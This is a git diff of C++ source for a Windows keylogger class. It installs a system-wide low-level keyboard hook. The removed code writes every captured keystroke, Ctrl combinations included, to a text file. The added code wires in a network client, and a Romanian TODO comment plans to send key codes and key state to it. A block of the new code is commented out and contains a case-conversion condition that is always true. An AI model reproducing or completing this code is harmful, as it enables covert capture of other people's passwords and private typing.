@@ -2,61 +2,47 @@
 
 
 keylogger::keylogger()
+    : hook(SetWindowsHookExA(WH_KEYBOARD_LL, &keylogger::LowLevelKeyboardProc, NULL, 0)),
+    client(&validation_function)
 {
-    hook = SetWindowsHookEx(WH_KEYBOARD_LL, &keylogger::KeyboardProc, NULL, 0);
-
 }
+
 keylogger::~keylogger()
 {
     if (hook != NULL)
         UnhookWindowsHookEx(hook);
+    client.Disconnect();
 }
 
-LRESULT CALLBACK keylogger::KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
+LRESULT CALLBACK keylogger::LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
+    static bool caps;
+    
     if (nCode >= 0 && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
-
         KBDLLHOOKSTRUCT* kbdStruct = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);
+        DWORD virtualKeyCode = kbdStruct->vkCode;
+        DWORD scanCode = kbdStruct->scanCode;
+        
 
-
-        int virtualKeyCode = kbdStruct->vkCode;
-        int scanCode = kbdStruct->scanCode;
-
-        bool ctrlPressed = ((GetAsyncKeyState(VK_CONTROL) & 0x8000));
-
-
-        BYTE keyboardState[256] = { 0 };
-        GetKeyboardState(keyboardState);
-
-        WORD asciiCode;
-        if (ToAscii(virtualKeyCode, scanCode, keyboardState, &asciiCode, 0) == 1) {
-
-            std::ofstream file("taste.txt", std::ios::app);
-
-
-            if (file.is_open()) {
-
-                if (ctrlPressed) {
-                    file << "Ctrl+ " << static_cast<char>(asciiCode);
+        /*if (virtualKeyCode != VK_CAPITAL)
+        {
+            WORD asciiCode;
+            BYTE keyboardState[256] = { 0 };
+            GetKeyboardState(keyboardState);
+            
+            if (ToAscii(virtualKeyCode, scanCode, keyboardState, &asciiCode, 0) != 0) {
+                if (asciiCode >= 'A' || asciiCode <= 'Z')
+                {
+                    asciiCode += (caps ? 32 : 0);
                 }
-                else
-                    file << static_cast<char>(asciiCode);
-
-
-                file.close();
+                std::cout << "S a tastat: " << char(asciiCode) << " Virtual code: " << virtualKeyCode << "\n";
             }
-            else {
-                std::cerr << "Eroare la deschiderea fisierului!" << std::endl;
+            else
+            {
+                std::cout << "Nu s a putut convertii vk! " << virtualKeyCode << "\n";
             }
-        }
+        }*/
     }
 
-
+ // TODO: Trimitem virtualKey ul si cu state pentru downkey si togglekey
     return CallNextHookEx(NULL, nCode, wParam, lParam);
 }
- keylogger& keylogger::GetInstance()
-{
-    static keylogger instance;
-    return instance;
-}
-
-HHOOK keylogger::keylogger::hook;
